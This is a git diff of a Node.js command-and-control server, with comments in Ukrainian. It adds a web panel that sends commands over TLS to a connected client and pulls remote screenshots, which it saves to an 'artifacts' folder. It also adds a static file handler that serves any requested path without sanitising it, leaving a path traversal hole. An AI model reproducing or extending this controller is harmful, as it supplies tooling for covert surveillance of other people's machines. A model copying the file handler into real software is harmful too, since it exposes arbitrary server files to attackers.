@@ -4,37 +4,37 @@ const fs = require('fs');
 const ejs = require('ejs');
 // const net = require('net');
 const tls = require('tls');
+const path = require('path');
 
-let integ;
+let integ = 5;
 let so_id;
+let wdir = "./web/"
+let adir = "./artifacts/"
 // Налаштування порту
 const WEB_PORT = 3000;
 const C2_PORT = 3001;
 
 const options = {
-    key: fs.readFileSync('privatekey.pem'),
-    cert: fs.readFileSync('certificate.pem'),
+    key: fs.readFileSync('cert/privatekey.pem'),
+    cert: fs.readFileSync('cert/certificate.pem'),
 };
-for (let i = 1; i <= 100; i++) {
-    setTimeout(() => {
-        integ = i;
-        console.log(i);
-    }, i * 1000); // Затримка в 1 секунду (1000 мілісекунд) для кожного числа
-}
 
 // Створення сервера
 const server = https.createServer(options, (req, res) => {
     const parsedUrl = url.parse(req.url, true);
-    const path = parsedUrl.pathname;
+    const path_ = parsedUrl.pathname;
     const query = parsedUrl.query;
+    // console.log(parsedUrl);
+    console.log(path_);
+    // console.log(query);
 
     switch(req.method) {
         case 'GET':
-            switch (path){
+            switch (path_){
                 case '/doit':
                     res.writeHead(200, { 'Content-Type': 'text/plain' });
                     // res.end(`Hello ${query.name}, you number ${integ} and id:${query.id}`);
-                    ejs.renderFile('./page2.ejs', { integ: integ, query: query }, (err, str) => {
+                    ejs.renderFile(wdir + 'page2.ejs', { integ: integ, query: query }, (err, str) => {
                         if (err) {
                             res.writeHead(500, { 'Content-Type': 'text/plain' });
                             res.end('Server error');
@@ -46,7 +46,7 @@ const server = https.createServer(options, (req, res) => {
                     break;
                 case '/':
                     res.writeHead(200, { 'Content-Type': 'text/html' });
-                    fs.readFile('./index.html', (err, data) => {
+                    fs.readFile(wdir + 'serv.html', (err, data) => {
                         if (err) {
                             res.writeHead(500, { 'Content-Type': 'text/plain' });
                             res.end('Server error');
@@ -55,6 +55,43 @@ const server = https.createServer(options, (req, res) => {
                             res.end(data);
                         }
                     })
+                    break;
+                default:
+                    const extname = String(path.extname(path_)).toLowerCase();
+                    const mimeTypes = {
+                        '.html': 'text/html',
+                        '.js': 'text/javascript',
+                        '.css': 'text/css',
+                        '.json': 'application/json',
+                        '.ico': 'image/x-icon',
+                        '.png': 'image/png',
+                        '.jpg': 'image/jpg',
+                        '.gif': 'image/gif',
+                        '.svg': 'image/svg+xml',
+                        '.woff': 'application/font-woff',
+                        '.woff2': 'application/font-woff2',
+                        '.otf': 'application/font-otf',
+                        '.ttf': 'application/font-ttf',
+                        '.eot': 'application/vnd.ms-fontobject',
+                        '.pdf': 'application/pdf',
+                        '.zip': 'application/zip',
+                        '.txt': 'text/plain',
+                    };
+                    const contentType = mimeTypes[extname] || 'application/octet-stream';
+                    fs.readFile(wdir + path_, (error, content) => {
+                        if (error) {
+                            if (error.code === 'ENOENT') {
+                                res.writeHead(404, { 'Content-Type': 'text/html' });
+                                res.end('<h1>404 Not Found</h1>', 'utf-8');
+                            } else {
+                                res.writeHead(500);
+                                res.end('Sorry, there was an error: ' + error.code + ' ..\n');
+                            }
+                        } else {
+                            res.writeHead(200, { 'Content-Type': contentType });
+                            res.end(content, 'utf-8');
+                        }
+                    });
             }
             break;
         case 'POST':
@@ -62,17 +99,22 @@ const server = https.createServer(options, (req, res) => {
             req.on('data', ch => {
                 body += ch.toString();
             });
-            switch(path){
+            switch(path_){
                 case '/send-id':
                     req.on('end', () => {
                         const params = new URLSearchParams(body);
-                        if (so_id) {
-                            so_id.write(`Id: ${params.get('id')}\n`);
-                            res.writeHead(200, { 'Content-Type': 'text/plain' });
-                            res.end('Ok');
+                        const id = Number(params.get('id'));
+                        console.log(`id: ${id}`);
+                        if (so_id && !so_id.destroyed && !isNaN(id)) {
+                            so_id.write(JSON.stringify({com: id}));
+                            so_id.once('data', (data) => {
+                                res.writeHead(200, { 'Content-Type': 'text/plain' });
+                                res.end(`Client response: ${data}`);
+                            })
+
                         } else {
                             res.writeHead(500, { 'Content-Type': 'text/plain' });
-                            res.end('No TCP client connected');
+                            res.end('No TCP client connected or bad comand');
                         }
                     });
 
@@ -82,6 +124,90 @@ const server = https.createServer(options, (req, res) => {
                         res.end('Server error');
                     });
                     break;
+                case '/do':
+                    req.on('end', () => {
+                        if (so_id && !so_id.destroyed) {
+                            const root = JSON.parse(body);
+                            switch(root.action) {
+                                case 'take_screenshot':
+                                    // fs.readFile('./sc.png', (err, data) =>{
+                                        if (false) {
+                                            console.error(`Error reading file: ${err}`);
+                                            res.writeHead(500, { 'Content-Type': 'application/json' });
+                                            res.end(JSON.stringify({ status: "error", message: "Unable to read screenshot file" }));
+                                        } else {
+                                            // const screenshotBase64 = data.toString('base64');
+                                            // res.writeHead(200, { 'Content-Type': 'application/json' });
+                                            // res.end(JSON.stringify({
+                                            //     status: "OK",
+                                            //     screenshot: `data:image/png;base64,${screenshotBase64}`
+                                            // }));
+                                            // Send initial command without closing the connection
+                                            so_id.write(JSON.stringify({ com: 0 }) + '\n\n\n');
+
+                                            let receivedData = '';
+
+                                            // Listen for incoming data
+                                            so_id.on('data', (data) => {
+                                                receivedData += data.toString();
+
+                                                // Process complete messages whenever the delimiter '\n\n\n' appears
+                                                while (receivedData.includes('\n\n\n')) {
+                                                    // Find the position of the delimiter
+                                                    const delimiterIndex = receivedData.indexOf('\n\n\n');
+                                                    
+                                                    // Extract the JSON message up to the delimiter
+                                                    const message = receivedData.slice(0, delimiterIndex);
+                                                    receivedData = receivedData.slice(delimiterIndex + 3); // Remove the processed message from receivedData
+
+                                                    try {
+                                                        // Parse and handle the complete JSON message
+                                                        const parsedData = JSON.parse(message);
+                                                        res.writeHead(200, { 'Content-Type': 'application/json' });
+
+                                                        const binpng = Buffer.from(parsedData.img, 'base64');
+                                                        fs.writeFile(`${adir}screenshot_${Math.floor(Date.now() / 1000)}.png`, binpng, (err) => {
+                                                            if (err) {
+                                                                console.error('Error writing file:', err);
+                                                            } else {
+                                                                console.log('File created successfully!');
+                                                            }
+                                                        });
+
+                                                        // Send JSON response with the parsed image data
+                                                        res.end(JSON.stringify({ status: "OK", screenshot: `data:image/png;base64,${parsedData.img}` }));
+                                                    } catch (error) {
+                                                        console.error('Error parsing JSON:', error);
+                                                        res.writeHead(500, { 'Content-Type': 'application/json' });
+                                                        res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
+                                                    }
+                                                }
+                                            });
+
+                                            // Handle connection end
+                                            so_id.on('end', () => {
+                                                console.log("Connection ended");
+                                            });
+
+                                            // Handle socket errors
+                                            so_id.on('error', (err) => {
+                                                console.error('Stream error:', err);
+                                                res.writeHead(500, { 'Content-Type': 'application/json' });
+                                                res.end(JSON.stringify({ status: "error", message: "Stream error" }));
+                                            });
+
+                                        }
+                                    // });
+                                break;
+                            default:
+                                console.log(`${root.action}`);
+                            }                               
+                        } else {
+                            res.writeHead(500, { 'Content-Type': 'application/json' });
+                            res.end(JSON.stringify({ status: "error", message: "Client is disconnected" }));
+                        }
+                    });
+                break;
             }
             break;
     }
@@ -92,8 +218,8 @@ const server2 = tls.createServer(options, (so) => {
     so_id = so;
 
     so.on('data', (data) => {
-        console.log(`Resv data: ${data}`);
-        so.write(`Send: ${integ}\n`);
+        //console.log(`Resv data: ${data}`);
+        // so.write(`Send: ${integ}\n`);
     });
 
     so.on('end', () => {
